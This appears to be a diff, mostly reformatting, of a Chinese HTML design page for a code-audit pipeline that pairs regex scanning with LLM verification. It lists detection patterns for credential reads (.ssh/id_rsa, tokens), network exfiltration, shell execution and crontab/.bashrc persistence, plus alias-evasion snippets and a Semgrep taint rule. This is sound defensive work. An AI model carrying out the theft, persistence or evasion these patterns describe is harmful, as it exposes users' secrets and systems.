@@ -2113,6 +2457,7 @@
     gap: 16px;
     margin-top: 16px;
   }
+
   .roi-card {
     background: var(--panel-2);
     border: 1px solid var(--line);
@@ -2123,11 +2468,13 @@
     gap: 12px;
     position: relative;
   }
+
   .roi-card.recommended {
     border-color: var(--accent);
     background: color-mix(in srgb, var(--accent) 5%, var(--panel-2));
     box-shadow: 0 4px 20px rgba(0, 0, 0, 0.05);
   }
+
   .roi-ribbon {
     position: absolute;
     top: 14px;
@@ -2139,6 +2486,7 @@
     background: var(--accent);
     color: #fff;
   }
+
   .roi-title {
     font-size: 15px;
     font-weight: 700;
@@ -2148,17 +2496,20 @@
     align-items: center;
     gap: 8px;
   }
+
   .roi-specs {
     font-size: 12px;
     color: var(--muted);
     line-height: 1.6;
     margin: 0;
   }
+
   .roi-tags {
     display: flex;
     flex-wrap: wrap;
     gap: 6px;
   }
+
   .roi-tag {
     font-size: 11px;
     font-family: var(--mono);
@@ -2170,20 +2521,60 @@
   }
 
   @media (max-width: 1080px) {
-    .hero { grid-template-columns: 1fr; }
-    .grid-3, .kpi { grid-template-columns: repeat(2, minmax(0, 1fr)); }
-    .bar-row { grid-template-columns: 1fr; }
-    .bar-row .value { text-align: left; }
+    .hero {
+      grid-template-columns: 1fr;
+    }
+
+    .grid-3,
+    .kpi {
+      grid-template-columns: repeat(2, minmax(0, 1fr));
+    }
+
+    .bar-row {
+      grid-template-columns: 1fr;
+    }
+
+    .bar-row .value {
+      text-align: left;
+    }
   }
+
   @media (max-width: 760px) {
-    .page { padding-inline: 14px; }
-    .grid-2, .grid-3, .kpi { grid-template-columns: 1fr; }
-    .summary-item, .step { grid-template-columns: 1fr; }
-    .hero { padding: 18px; border-radius: 18px; }
-    .section { padding: 18px; border-radius: 18px; }
+    .page {
+      padding-inline: 14px;
+    }
+
+    .grid-2,
+    .grid-3,
+    .kpi {
+      grid-template-columns: 1fr;
+    }
+
+    .summary-item,
+    .step {
+      grid-template-columns: 1fr;
+    }
+
+    .hero {
+      padding: 18px;
+      border-radius: 18px;
+    }
+
+    .section {
+      padding: 18px;
+      border-radius: 18px;
+    }
   }
+
   @media (prefers-reduced-motion: reduce) {
-    *, *::before, *::after { scroll-behavior: auto !important; transition: none !important; animation: none !important; }
+
+    *,
+    *::before,
+    *::after {
+      scroll-behavior: auto !important;
+      transition: none !important;
+      animation: none !important;
+    }
   }
 </style>
 
@@ -2212,7 +2603,9 @@
         </div>
         <div class="summary-item">
           <b>依据</b>
-          <p>结合 `qwen-audit-implementation-design.md`、`audit-rules-design.md`、`audit-prompt-matrix.md`、`audit-evaluation-results-template.md` 与 `audit-eval-iteration-log.md` 的已有结论。</p>
+          <p>结合
+            `qwen-audit-implementation-design.md`、`audit-rules-design.md`、`audit-prompt-matrix.md`、`audit-evaluation-results-template.md`
+            与 `audit-eval-iteration-log.md` 的已有结论。</p>
         </div>
       </div>
     </div>
@@ -2225,15 +2618,19 @@
         <p class="lead">本节描述 TAA 代码审计的分层框架，以及各层之间的输入、输出和职责分配。图中实线表示现有框架，下方虚线带表示最终完整框架中待补的检索增强与结构化表示增强。</p>
 
         <figure class="framework-figure">
-          <svg class="framework-svg" viewBox="0 0 1400 560" role="img" aria-label="TAA 代码审计框架图，左侧是现有链路：源码树、静态扫描、结构化证据、Prompt 模板、LLM 验证；右侧是 qwen verdict 输出；下方是未完成能力：检索增强与结构化表示增强，它们指向结构化证据并作为未来补强。">
+          <svg class="framework-svg" viewBox="0 0 1400 560" role="img"
+            aria-label="TAA 代码审计框架图，左侧是现有链路：源码树、静态扫描、结构化证据、Prompt 模板、LLM 验证；右侧是 qwen verdict 输出；下方是未完成能力：检索增强与结构化表示增强，它们指向结构化证据并作为未来补强。">
             <defs>
-              <marker id="fw-arrow" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="8" markerHeight="8" orient="auto-start-reverse">
+              <marker id="fw-arrow" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="8" markerHeight="8"
+                orient="auto-start-reverse">
                 <path d="M 0 0 L 10 5 L 0 10 z" fill="currentColor"></path>
               </marker>
-              <marker id="fw-arrow-accent" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="8" markerHeight="8" orient="auto-start-reverse">
+              <marker id="fw-arrow-accent" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="8" markerHeight="8"
+                orient="auto-start-reverse">
                 <path d="M 0 0 L 10 5 L 0 10 z" fill="currentColor"></path>
               </marker>
-              <marker id="fw-arrow-warn" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="8" markerHeight="8" orient="auto-start-reverse">
+              <marker id="fw-arrow-warn" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="8" markerHeight="8"
+                orient="auto-start-reverse">
                 <path d="M 0 0 L 10 5 L 0 10 z" fill="currentColor"></path>
               </marker>
             </defs>
@@ -2305,13 +2702,16 @@
 
             <path d="M 865 398 C 858 374, 782 344, 620 296" class="fw-line fw-line--future"></path>
           </svg>
-          <figcaption>图 1：TAA 代码审计的主流程采用“静态召回 → 结构化证据 → Prompt 模板 → LLM 验证”的现有框架；右侧卡片列出 qwen 可能输出的 verdict / risk_level，下方虚线带表示最终完整框架中待补的检索增强与结构化表示增强，并用箭头指向结构化证据，不把结果展示层放进这张框架图。LLM 不可用或解析失败时进入 <span class="mono">UNCERTAIN</span> 并按保守策略合并。</figcaption>
+          <figcaption>图 1：TAA 代码审计的主流程采用“静态召回 → 结构化证据 → Prompt 模板 → LLM 验证”的现有框架；右侧卡片列出 qwen 可能输出的 verdict /
+            risk_level，下方虚线带表示最终完整框架中待补的检索增强与结构化表示增强，并用箭头指向结构化证据，不把结果展示层放进这张框架图。LLM 不可用或解析失败时进入 <span
+              class="mono">UNCERTAIN</span> 并按保守策略合并。</figcaption>
         </figure>
       </section>
 
       <section class="section" id="scanner">
         <h2>2. 静态规则与扫描窗口</h2>
-        <p class="lead">静态扫描不是模糊的“找可疑代码”，而是一个可枚举的规则表。当前 analyzer 只扫描 Python 文件，跳过注释行、隐藏目录和 `__pycache__`，每条命中都会带出固定大小的上下文窗口。</p>
+        <p class="lead">静态扫描不是模糊的“找可疑代码”，而是一个可枚举的规则表。当前 analyzer 只扫描 Python 文件，跳过注释行、隐藏目录和
+          `__pycache__`，每条命中都会带出固定大小的上下文窗口。</p>
 
         <div class="spec-grid">
           <div class="spec">
@@ -2329,8 +2729,10 @@
             <h3>邻近行到底是多少行</h3>
             <ul>
               <li>当前实现固定取触发行前 <strong>3 行</strong> 和后 <strong>3 行</strong>。</li>
-              <li>窗口公式等价于：<span class="mono">start = max(0, i-3)</span>，<span class="mono">end = min(len(lines), i+4)</span>。</li>
-              <li>返回给 LLM 的 <span class="mono">context_before</span> 不含当前行，<span class="mono">context_after</span> 也不含当前行。</li>
+              <li>窗口公式等价于：<span class="mono">start = max(0, i-3)</span>，<span class="mono">end = min(len(lines),
+                  i+4)</span>。</li>
+              <li>返回给 LLM 的 <span class="mono">context_before</span> 不含当前行，<span class="mono">context_after</span>
+                也不含当前行。</li>
               <li>也就是说，LLM 看到的是“前 3 行 + 触发行 + 后 3 行”，共最多 7 行。</li>
             </ul>
           </div>
@@ -2342,8 +2744,10 @@
           <div class="rule-meta-bar">
             <div class="rule-stats">
               <span class="rule-stat-item">规则总数：<strong>9</strong> 项核心规则</span>
-              <span class="rule-stat-item">严重度分布：<span class="rule-stat-tag high">HIGH 高危 6</span><span class="rule-stat-tag med">MEDIUM 中危 3</span></span>
-              <span class="rule-stat-item" style="color: var(--muted); font-size: 12px;">架构定位：粗筛宽召回，由本地 LLM 结合上下文二次校验</span>
+              <span class="rule-stat-item">严重度分布：<span class="rule-stat-tag high">HIGH 高危 6</span><span
+                  class="rule-stat-tag med">MEDIUM 中危 3</span></span>
+              <span class="rule-stat-item" style="color: var(--muted); font-size: 12px;">架构定位：粗筛宽召回，由本地 LLM
+                结合上下文二次校验</span>
             </div>
             <div class="rule-toolbar-controls">
               <!-- 分类过滤器 -->
@@ -2379,7 +2783,11 @@
                 <span class="rule-sev-pill sev-high"><span class="sev-dot"></span>HIGH 高危</span>
               </div>
               <div class="rule-chips-section">
-                <span class="rule-chips-label"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="m10 15 5-3-5-3v6Z"/></svg> 触发模式与匹配签名</span>
+                <span class="rule-chips-label"><svg width="12" height="12" viewBox="0 0 24 24" fill="none"
+                    stroke="currentColor" stroke-width="2">
+                    <circle cx="12" cy="12" r="10" />
+                    <path d="m10 15 5-3-5-3v6Z" />
+                  </svg> 触发模式与匹配签名</span>
                 <div class="rule-chips-container">
                   <code class="rule-code-chip">requests.get / post / put / delete / patch</code>
                   <code class="rule-code-chip">urllib.request.urlopen / urlretrieve</code>
@@ -2404,7 +2812,11 @@
                 <span class="rule-sev-pill sev-high"><span class="sev-dot"></span>HIGH 高危</span>
               </div>
               <div class="rule-chips-section">
-                <span class="rule-chips-label"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="m10 15 5-3-5-3v6Z"/></svg> 触发模式与匹配签名</span>
+                <span class="rule-chips-label"><svg width="12" height="12" viewBox="0 0 24 24" fill="none"
+                    stroke="currentColor" stroke-width="2">
+                    <circle cx="12" cy="12" r="10" />
+                    <path d="m10 15 5-3-5-3v6Z" />
+                  </svg> 触发模式与匹配签名</span>
                 <div class="rule-chips-container">
                   <code class="rule-code-chip">socket.socket</code>
                   <code class="rule-code-chip">socket.create_connection</code>
@@ -2427,7 +2839,11 @@
                 <span class="rule-sev-pill sev-high"><span class="sev-dot"></span>HIGH 高危</span>
               </div>
               <div class="rule-chips-section">
-                <span class="rule-chips-label"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="m10 15 5-3-5-3v6Z"/></svg> 触发模式与匹配签名</span>
+                <span class="rule-chips-label"><svg width="12" height="12" viewBox="0 0 24 24" fill="none"
+                    stroke="currentColor" stroke-width="2">
+                    <circle cx="12" cy="12" r="10" />
+                    <path d="m10 15 5-3-5-3v6Z" />
+                  </svg> 触发模式与匹配签名</span>
                 <div class="rule-chips-container">
                   <code class="rule-code-chip">subprocess.run / call / Popen</code>
                   <code class="rule-code-chip">subprocess.check_output</code>
@@ -2452,7 +2868,11 @@
                 <span class="rule-sev-pill sev-medium"><span class="sev-dot"></span>MEDIUM 中危</span>
               </div>
               <div class="rule-chips-section">
-                <span class="rule-chips-label"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="m10 15 5-3-5-3v6Z"/></svg> 触发模式与匹配签名</span>
+                <span class="rule-chips-label"><svg width="12" height="12" viewBox="0 0 24 24" fill="none"
+                    stroke="currentColor" stroke-width="2">
+                    <circle cx="12" cy="12" r="10" />
+                    <path d="m10 15 5-3-5-3v6Z" />
+                  </svg> 触发模式与匹配签名</span>
                 <div class="rule-chips-container">
                   <code class="rule-code-chip">eval(...)</code>
                   <code class="rule-code-chip">exec(...)</code>
@@ -2476,7 +2896,11 @@
                 <span class="rule-sev-pill sev-medium"><span class="sev-dot"></span>MEDIUM 中危</span>
               </div>
               <div class="rule-chips-section">
-                <span class="rule-chips-label"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="m10 15 5-3-5-3v6Z"/></svg> 触发模式与匹配签名</span>
+                <span class="rule-chips-label"><svg width="12" height="12" viewBox="0 0 24 24" fill="none"
+                    stroke="currentColor" stroke-width="2">
+                    <circle cx="12" cy="12" r="10" />
+                    <path d="m10 15 5-3-5-3v6Z" />
+                  </svg> 触发模式与匹配签名</span>
                 <div class="rule-chips-container">
                   <code class="rule-code-chip">open / Path.read_text / read_bytes</code>
                   <code class="rule-code-chip">.ssh / id_rsa / authorized_keys</code>
@@ -2499,7 +2923,11 @@
                 <span class="rule-sev-pill sev-medium"><span class="sev-dot"></span>MEDIUM 中危</span>
               </div>
               <div class="rule-chips-section">
-                <span class="rule-chips-label"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="m10 15 5-3-5-3v6Z"/></svg> 触发模式与匹配签名</span>
+                <span class="rule-chips-label"><svg width="12" height="12" viewBox="0 0 24 24" fill="none"
+                    stroke="currentColor" stroke-width="2">
+                    <circle cx="12" cy="12" r="10" />
+                    <path d="m10 15 5-3-5-3v6Z" />
+                  </svg> 触发模式与匹配签名</span>
                 <div class="rule-chips-container">
                   <code class="rule-code-chip">os.environ[...] / os.getenv(...)</code>
                   <code class="rule-code-chip">secret / token / api_key / access_key</code>
@@ -2522,7 +2950,11 @@
                 <span class="rule-sev-pill sev-high"><span class="sev-dot"></span>HIGH 高危</span>
               </div>
               <div class="rule-chips-section">
-                <span class="rule-chips-label"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="m10 15 5-3-5-3v6Z"/></svg> 触发模式与匹配签名</span>
+                <span class="rule-chips-label"><svg width="12" height="12" viewBox="0 0 24 24" fill="none"
+                    stroke="currentColor" stroke-width="2">
+                    <circle cx="12" cy="12" r="10" />
+                    <path d="m10 15 5-3-5-3v6Z" />
+                  </svg> 触发模式与匹配签名</span>
                 <div class="rule-chips-container">
                   <code class="rule-code-chip">base64.b64decode / b64encode</code>
                   <code class="rule-code-chip">pickle.loads / dumps</code>
@@ -2547,7 +2979,11 @@
                 <span class="rule-sev-pill sev-high"><span class="sev-dot"></span>HIGH 高危</span>
               </div>
               <div class="rule-chips-section">
-                <span class="rule-chips-label"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="m10 15 5-3-5-3v6Z"/></svg> 触发模式与匹配签名</span>
+                <span class="rule-chips-label"><svg width="12" height="12" viewBox="0 0 24 24" fill="none"
+                    stroke="currentColor" stroke-width="2">
+                    <circle cx="12" cy="12" r="10" />
+                    <path d="m10 15 5-3-5-3v6Z" />
+                  </svg> 触发模式与匹配签名</span>
                 <div class="rule-chips-container">
                   <code class="rule-code-chip">crontab / cron.tab</code>
                   <code class="rule-code-chip">.bashrc / .bash_profile / .zshrc / .profile</code>
@@ -2570,7 +3006,11 @@
                 <span class="rule-sev-pill sev-high"><span class="sev-dot"></span>HIGH 高危</span>
               </div>
               <div class="rule-chips-section">
-                <span class="rule-chips-label"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="m10 15 5-3-5-3v6Z"/></svg> 触发模式与匹配签名（复合正则）</span>
+                <span class="rule-chips-label"><svg width="12" height="12" viewBox="0 0 24 24" fill="none"
+                    stroke="currentColor" stroke-width="2">
+                    <circle cx="12" cy="12" r="10" />
+                    <path d="m10 15 5-3-5-3v6Z" />
+                  </svg> 触发模式与匹配签名（复合正则）</span>
                 <div class="rule-chips-container">
                   <code class="rule-code-chip">base64.*request / request.*base64</code>
                   <code class="rule-code-chip">json.dumps.*post / post.*json.dumps</code>
@@ -2768,7 +3208,7 @@
         </div>
 
         <script>
-          (function() {
+          (function () {
             // 规则分类与严重级别交互过滤逻辑
             const filterBtns = document.querySelectorAll('#ruleFilterGroup .rule-filter-btn');
             const ruleCards = document.querySelectorAll('#ruleCardGrid .rule-card');
@@ -2833,8 +3273,10 @@
           </div>
 
           <p class="semgrep-lead">
-            当前静态扫描基于纯文本与正则匹配（Regex Scanner），具备<strong>极低延迟（&lt;10ms）与零外部依赖</strong>的天然优势；但在面临攻击者采用<strong>模块导入重命名（Alias Evasion）、动态反射加载与跨行数据传递</strong>时存在检测盲区。
-            将 <strong>Semgrep</strong> 引入 TAA 静态扫描层，能够基于抽象语法树（AST）建立<strong>语义模式匹配</strong>与<strong>端到端污点追踪（Taint Tracking）</strong>，使第一道防线从“单行关键词粗筛”跃升为“结构化攻击链路预判”。
+            当前静态扫描基于纯文本与正则匹配（Regex Scanner），具备<strong>极低延迟（&lt;10ms）与零外部依赖</strong>的天然优势；但在面临攻击者采用<strong>模块导入重命名（Alias
+              Evasion）、动态反射加载与跨行数据传递</strong>时存在检测盲区。
+            将 <strong>Semgrep</strong> 引入 TAA 静态扫描层，能够基于抽象语法树（AST）建立<strong>语义模式匹配</strong>与<strong>端到端污点追踪（Taint
+              Tracking）</strong>，使第一道防线从“单行关键词粗筛”跃升为“结构化攻击链路预判”。
           </p>
 
           <!-- 机制对比面板 -->
@@ -2846,15 +3288,19 @@
               </div>
               <ul class="semgrep-compare-list">
                 <li><strong>匹配粒度：</strong>基于单行文本字符串或基础正则，逐行无状态扫描。</li>
-                <li><strong>别名逃逸盲区：</strong>无法感知 <code>import socket as s; s.connect()</code> 或 <code>getattr(os, "system")</code> 等别名重命名。</li>
-                <li><strong>数据流盲区：</strong>无法判断变量取值来源，无法追踪 <code>key = os.getenv(); requests.post(key)</code> 的跨行传递。</li>
+                <li><strong>别名逃逸盲区：</strong>无法感知 <code>import socket as s; s.connect()</code> 或
+                  <code>getattr(os, "system")</code> 等别名重命名。
+                </li>
+                <li><strong>数据流盲区：</strong>无法判断变量取值来源，无法追踪 <code>key = os.getenv(); requests.post(key)</code> 的跨行传递。
+                </li>
                 <li><strong>证据颗粒：</strong>仅能机械切取触发行前后固定的 3 行物理代码作为局部上下文。</li>
               </ul>
             </div>
 
             <div class="semgrep-compare-card enhanced">
               <div class="semgrep-compare-head">
-                <span class="semgrep-compare-title" style="color: var(--accent);">🚀 增强：Semgrep AST 语义与污点引擎 (Semgrep Enhanced)</span>
+                <span class="semgrep-compare-title" style="color: var(--accent);">🚀 增强：Semgrep AST 语义与污点引擎 (Semgrep
+                  Enhanced)</span>
                 <span class="semgrep-tag" style="padding: 2px 8px; font-size: 10.5px;">引入后提升</span>
               </div>
               <ul class="semgrep-compare-list">
@@ -2874,7 +3320,8 @@
                 <span class="semgrep-perk-name">1. 消除别名与混淆逃逸</span>
               </div>
               <p class="semgrep-perk-desc">
-                基于语法树符号解析，即便攻击代码采用 <code>import urllib.request as u</code>、<code>from os import system as cmd</code> 或将敏感库解构重命名，Semgrep 均能穿透混淆并准确捕获调用点。
+                基于语法树符号解析，即便攻击代码采用 <code>import urllib.request as u</code>、<code>from os import system as cmd</code>
+                或将敏感库解构重命名，Semgrep 均能穿透混淆并准确捕获调用点。
               </p>
             </div>
 
@@ -2884,7 +3331,8 @@
                 <span class="semgrep-perk-name">2. 跨行污点渗漏追踪 (Taint)</span>
               </div>
               <p class="semgrep-perk-desc">
-                将“凭证读取”（Source，如 <code>os.environ</code>、<code>.ssh</code>）与“网络外发”（Sink，如 <code>requests.post</code>、<code>socket.send</code>）关联。只要变量产生数据流交叉即触发污点告警，识别真正的外发通道。
+                将“凭证读取”（Source，如 <code>os.environ</code>、<code>.ssh</code>）与“网络外发”（Sink，如
+                <code>requests.post</code>、<code>socket.send</code>）关联。只要变量产生数据流交叉即触发污点告警，识别真正的外发通道。
               </p>
             </div>
 
@@ -2894,7 +3342,8 @@
                 <span class="semgrep-perk-name">3. 压降 40%~60% 语法误报</span>
               </div>
               <p class="semgrep-perk-desc">
-                利用 <code>pattern-not-inside</code> 语法排除测试框架（如 <code>pytest/unittest</code> 中的 mock 调用）与绘图指标上报代码，在进入大模型前滤除无效噪点，大幅节省 TEE 容器内推理算力。
+                利用 <code>pattern-not-inside</code> 语法排除测试框架（如 <code>pytest/unittest</code> 中的 mock
+                调用）与绘图指标上报代码，在进入大模型前滤除无效噪点，大幅节省 TEE 容器内推理算力。
               </p>
             </div>
 
@@ -2904,7 +3353,8 @@
                 <span class="semgrep-perk-name">4. 赋能 LLM 结构化证据链</span>
               </div>
               <p class="semgrep-perk-desc">
-                打破传统 7 行固定上下文的割裂限制，将 Semgrep 计算出的污点流动跃迁行号与调用链直接注入 <code>Finding Prompt</code>，让大模型免于在冗余代码中盲目搜索，使研判准确度呈代际提升。
+                打破传统 7 行固定上下文的割裂限制，将 Semgrep 计算出的污点流动跃迁行号与调用链直接注入
+                <code>Finding Prompt</code>，让大模型免于在冗余代码中盲目搜索，使研判准确度呈代际提升。
               </p>
             </div>
           </div>
@@ -2912,25 +3362,30 @@
           <!-- 声明式规则 YAML 示例展示 -->
           <div class="semgrep-rule-demo">
             <span class="semgrep-demo-title">📋 框架适配示例：TAA 敏感凭证跨行外传污点规则 (Semgrep Taint Rule Spec)</span>
-            <div class="codebox" style="margin: 0; font-size: 12px; line-height: 1.5;"><span style="color: var(--muted);"># Semgrep 污点分析规则：捕获敏感凭据提取并经由网络外发</span>
-<span style="color: var(--accent);">rules:</span>
-  - <span style="color: var(--accent);">id:</span> <span style="color: var(--text);">taa-secret-exfiltration-taint</span>
-    <span style="color: var(--accent);">languages:</span> [python]
-    <span style="color: var(--accent);">severity:</span> ERROR
-    <span style="color: var(--accent);">message:</span> <span style="color: var(--warn);">"检测到系统敏感环境变量或私钥凭证通过网络信道被外发传出"</span>
-    <span style="color: var(--accent);">mode:</span> <span style="font-weight: bold; color: var(--accent);">taint</span>
-    <span style="color: var(--accent);">pattern-sources:</span>
-      - <span style="color: var(--accent);">pattern:</span> os.environ[...]
-      - <span style="color: var(--accent);">pattern:</span> os.getenv(...)
-      - <span style="color: var(--accent);">pattern:</span> open(..., ".ssh/id_rsa").read()
-    <span style="color: var(--accent);">pattern-sinks:</span>
-      - <span style="color: var(--accent);">pattern:</span> requests.post(..., data=$VAR, ...)
-      - <span style="color: var(--accent);">pattern:</span> requests.get(..., params=$VAR, ...)
-      - <span style="color: var(--accent);">pattern:</span> socket.socket().sendall(...)
-    <span style="color: var(--accent);">pattern-not-inside:</span>
-      - <span style="color: var(--accent);">pattern:</span> |
-          def test_...(...):
-              ...</div>
+            <div class="codebox" style="margin: 0; font-size: 12px; line-height: 1.5;"><span
+                style="color: var(--muted);"># Semgrep 污点分析规则：捕获敏感凭据提取并经由网络外发</span>
+              <span style="color: var(--accent);">rules:</span>
+              - <span style="color: var(--accent);">id:</span> <span
+                style="color: var(--text);">taa-secret-exfiltration-taint</span>
+              <span style="color: var(--accent);">languages:</span> [python]
+              <span style="color: var(--accent);">severity:</span> ERROR
+              <span style="color: var(--accent);">message:</span> <span
+                style="color: var(--warn);">"检测到系统敏感环境变量或私钥凭证通过网络信道被外发传出"</span>
+              <span style="color: var(--accent);">mode:</span> <span
+                style="font-weight: bold; color: var(--accent);">taint</span>
+              <span style="color: var(--accent);">pattern-sources:</span>
+              - <span style="color: var(--accent);">pattern:</span> os.environ[...]
+              - <span style="color: var(--accent);">pattern:</span> os.getenv(...)
+              - <span style="color: var(--accent);">pattern:</span> open(..., ".ssh/id_rsa").read()
+              <span style="color: var(--accent);">pattern-sinks:</span>
+              - <span style="color: var(--accent);">pattern:</span> requests.post(..., data=$VAR, ...)
+              - <span style="color: var(--accent);">pattern:</span> requests.get(..., params=$VAR, ...)
+              - <span style="color: var(--accent);">pattern:</span> socket.socket().sendall(...)
+              <span style="color: var(--accent);">pattern-not-inside:</span>
+              - <span style="color: var(--accent);">pattern:</span> |
+              def test_...(...):
+              ...
+            </div>
           </div>
         </div>
 
@@ -2951,43 +3406,59 @@
             <span class="seq-badge-sub">两级 Prompt 分阶段独立调度 · 拒绝整包混合发送 · 动静协同双道防线</span>
           </div>
 
-          <svg class="sequence-svg" viewBox="0 0 1160 670" role="img" aria-label="LLM 审计执行时序图：展示静态扫描、逐点 Finding 级独立推理、按文件 File 级宏观推理及最终 Gate 决策的分阶段流程">
+          <svg class="sequence-svg" viewBox="0 0 1160 670" role="img"
+            aria-label="LLM 审计执行时序图：展示静态扫描、逐点 Finding 级独立推理、按文件 File 级宏观推理及最终 Gate 决策的分阶段流程">
             <defs>
-              <marker id="seq-arrow" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse">
+              <marker id="seq-arrow" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="7" markerHeight="7"
+                orient="auto-start-reverse">
                 <path d="M 0 1 L 9 5 L 0 9 z" fill="currentColor" />
               </marker>
-              <marker id="seq-arrow-accent" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse">
+              <marker id="seq-arrow-accent" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="7" markerHeight="7"
+                orient="auto-start-reverse">
                 <path d="M 0 1 L 9 5 L 0 9 z" fill="var(--accent)" />
               </marker>
-              <marker id="seq-arrow-warn" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse">
+              <marker id="seq-arrow-warn" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="7" markerHeight="7"
+                orient="auto-start-reverse">
                 <path d="M 0 1 L 9 5 L 0 9 z" fill="var(--warn)" />
               </marker>
-              <marker id="seq-arrow-success" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse">
+              <marker id="seq-arrow-success" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="7" markerHeight="7"
+                orient="auto-start-reverse">
                 <path d="M 0 1 L 9 5 L 0 9 z" fill="var(--success)" />
               </marker>
             </defs>
 
             <!-- 阶段分组底色背景 -->
             <!-- 阶段 1 背景 -->
-            <rect x="20" y="80" width="1120" height="115" rx="10" fill="color-mix(in srgb, var(--panel-2) 65%, transparent)" stroke="var(--line)" stroke-width="1.2" />
-            <rect x="20" y="80" width="165" height="24" rx="8" fill="var(--panel-2)" stroke="var(--line)" stroke-width="1.2" />
+            <rect x="20" y="80" width="1120" height="115" rx="10"
+              fill="color-mix(in srgb, var(--panel-2) 65%, transparent)" stroke="var(--line)" stroke-width="1.2" />
+            <rect x="20" y="80" width="165" height="24" rx="8" fill="var(--panel-2)" stroke="var(--line)"
+              stroke-width="1.2" />
             <text x="32" y="96" font-size="11.5" font-weight="700" fill="var(--muted)">阶段 1 · 静态正则扫描</text>
 
             <!-- 阶段 2 背景 -->
-            <rect x="20" y="208" width="1120" height="145" rx="10" fill="color-mix(in srgb, var(--accent) 4%, transparent)" stroke="color-mix(in srgb, var(--accent) 30%, var(--line))" stroke-width="1.2" />
-            <rect x="20" y="208" width="220" height="24" rx="8" fill="color-mix(in srgb, var(--accent) 15%, var(--panel))" stroke="color-mix(in srgb, var(--accent) 40%, var(--line))" stroke-width="1.2" />
+            <rect x="20" y="208" width="1120" height="145" rx="10"
+              fill="color-mix(in srgb, var(--accent) 4%, transparent)"
+              stroke="color-mix(in srgb, var(--accent) 30%, var(--line))" stroke-width="1.2" />
+            <rect x="20" y="208" width="220" height="24" rx="8"
+              fill="color-mix(in srgb, var(--accent) 15%, var(--panel))"
+              stroke="color-mix(in srgb, var(--accent) 40%, var(--line))" stroke-width="1.2" />
             <text x="32" y="224" font-size="11.5" font-weight="700" fill="var(--accent)">阶段 2 · Finding 级单点语义判定</text>
             <text x="248" y="224" font-size="11" fill="var(--muted)">（微观行级 · 触发行前后各 3 行 · 独立 HTTP 循环请求）</text>
 
             <!-- 阶段 3 背景 -->
-            <rect x="20" y="365" width="1120" height="145" rx="10" fill="color-mix(in srgb, var(--warn) 4%, transparent)" stroke="color-mix(in srgb, var(--warn) 30%, var(--line))" stroke-width="1.2" />
-            <rect x="20" y="365" width="200" height="24" rx="8" fill="color-mix(in srgb, var(--warn) 15%, var(--panel))" stroke="color-mix(in srgb, var(--warn) 40%, var(--line))" stroke-width="1.2" />
+            <rect x="20" y="365" width="1120" height="145" rx="10"
+              fill="color-mix(in srgb, var(--warn) 4%, transparent)"
+              stroke="color-mix(in srgb, var(--warn) 30%, var(--line))" stroke-width="1.2" />
+            <rect x="20" y="365" width="200" height="24" rx="8" fill="color-mix(in srgb, var(--warn) 15%, var(--panel))"
+              stroke="color-mix(in srgb, var(--warn) 40%, var(--line))" stroke-width="1.2" />
             <text x="32" y="381" font-size="11.5" font-weight="700" fill="var(--warn)">阶段 3 · File 级宏观攻击链研判</text>
             <text x="238" y="381" font-size="11" fill="var(--muted)">（宏观文件级 · 前 80 行代码 + 规则摘要 · 独立 HTTP 请求）</text>
 
             <!-- 阶段 4 背景 -->
-            <rect x="20" y="522" width="1120" height="125" rx="10" fill="color-mix(in srgb, var(--panel-2) 65%, transparent)" stroke="var(--line)" stroke-width="1.2" />
-            <rect x="20" y="522" width="190" height="24" rx="8" fill="var(--panel-2)" stroke="var(--line)" stroke-width="1.2" />
+            <rect x="20" y="522" width="1120" height="125" rx="10"
+              fill="color-mix(in srgb, var(--panel-2) 65%, transparent)" stroke="var(--line)" stroke-width="1.2" />
+            <rect x="20" y="522" width="190" height="24" rx="8" fill="var(--panel-2)" stroke="var(--line)"
+              stroke-width="1.2" />
             <text x="32" y="538" font-size="11.5" font-weight="700" fill="var(--muted)">阶段 4 · 综合决策与 Gate 门禁</text>
 
             <!-- 角色生命线 (Lifelines) -->
@@ -3000,68 +3471,99 @@
             <!-- 角色 Header 卡片 -->
             <g transform="translate(55, 14)">
               <rect width="150" height="42" rx="8" fill="var(--panel)" stroke="var(--line)" stroke-width="1.5" />
-              <text x="75" y="26" text-anchor="middle" font-size="12.5" font-weight="700" fill="var(--text)">📁 待审源码树</text>
+              <text x="75" y="26" text-anchor="middle" font-size="12.5" font-weight="700" fill="var(--text)">📁
+                待审源码树</text>
             </g>
             <g transform="translate(285, 14)">
               <rect width="150" height="42" rx="8" fill="var(--panel)" stroke="var(--line)" stroke-width="1.5" />
